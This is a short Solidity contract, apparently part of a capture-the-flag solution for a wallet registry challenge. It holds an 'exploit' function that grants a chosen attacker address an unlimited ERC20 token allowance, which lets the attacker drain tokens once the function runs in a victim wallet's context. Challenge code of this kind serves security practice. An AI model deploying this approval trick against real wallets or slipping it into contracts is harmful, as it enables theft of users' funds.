// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract WalletRegistryAbuser {
    constructor() {
    }

    function exploit(address token, address attacker) external {
        IERC20(token).approve(attacker, type(uint256).max);
    }

    fallback() external {
        console.log("fallback");
    }
}